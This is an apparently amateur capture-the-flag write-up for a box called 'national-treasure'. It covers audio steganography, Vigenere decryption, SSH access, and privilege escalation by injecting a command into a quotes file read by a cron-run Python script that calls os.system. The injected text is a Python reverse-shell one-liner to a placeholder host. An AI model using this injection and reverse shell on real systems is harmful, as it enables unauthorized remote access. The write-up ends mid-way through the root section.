* must_practice_corrupt_file.mp3: containt a hidden message.
I used sonic-visualiser to analyzed the audio and acquired a password
* dad_tasks: contain a cipher text in base64
decoded the text from base64:
```

```
after some using analyzer, I found out that the text is encrypted with Vigenere Cipher, by using the password that we acquired from the .mp3 to decrypt the text:

# foothold
now let ssh to the server using weston + password:

```console
weston@national-treasure:~$ sudo -l
[sudo] password for weston: 
Matching Defaults entries for weston on national-treasure:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User weston may run the following commands on national-treasure:
    (root) /usr/bin/bees
weston@national-treasure:~$ ^C
weston@national-treasure:~$ cat /usr/bin/bees

wall "AHHHHHHH THEEEEE BEEEEESSSS!!!!!!!!"

weston@national-treasure:~$ id
uid=1001(weston) gid=1001(weston) groups=1001(weston),1000(cage)
```
during the time I enumerate the server, there is a message which pop up from time to time (cronjob)
```
Broadcast message from cage@national-treasure (somewhere) (Sat Jul 25 13:42:01

```
As you see, there is a file call `bees` which didnt do much. note that weston are user of group `cage`. I then decided to serach for a file which own by *group cage*
```console
weston@national-treasure:~$ find / -group cage 2> /dev/null
/home/cage
/opt/.dads_scripts
/opt/.dads_scripts/spread_the_quotes.py
/opt/.dads_scripts/.files
/opt/.dads_scripts/.files/.quote
weston@national-treasure:~$ ls -la /opt/.dads_scripts/.files/.quotes
-rwxrw---- 1 cage cage 4204 May 25 23:47 /opt/.dads_scripts/.files/.quotes
```
There are really interesting file. for instance `spread_the_quotes.py`
```py
weston@national-treasure:~$ cat /opt/.dads_scripts/spread_the_quotes.py
#!/usr/bin/env python

#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)
```
so the script is pick a quote randomly from `/opt/.dads_scripts/.files/.quotes`. Thereafter `os.system` was call to print the qoute. Since `os.system` was call, we can inject a os command to script and make it do what ever we want. In this case we will inject a reverse shell to `/opt/.dads_scripts/.files/.quotes`.


remove all qoute by ```echo '' > /opt/.dads_scripts/.files/.quotes``` and insert the following command in `.quotes`: 
```py
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",6969));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
note that we added `;`. coz we need to escalate from `'wall + '`. now `os.system` will execute *wall* and our reverse shell seperately. Now open netcat and wait for the shell

# user flag
```
$ whoami
cage
$ ls
email_backup
Super_Duper_Checklist
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ id
id
uid=1000(cage) gid=1000(cage) groups=1000(cage),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)
```
the user flag can be found in one of the file in `/home/cage`.

# root
after some enumerating I found a really wried email:
```
Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
down what it said. Could you look into it please? I think it could be something to do with his
account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
sure he's out to get me. The note said:

haiinspsyanileph

The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
ahahahhahaha. Ahhh Face it... he's just odd. 

Regards

The Legend - Cage
```
`haiinspsyanileph` is a cipher text. enctyted using Vigenere cipher: what is the password? check for the word that appear many time in the text. User Chef, Vigenere decoder to get the plaintext
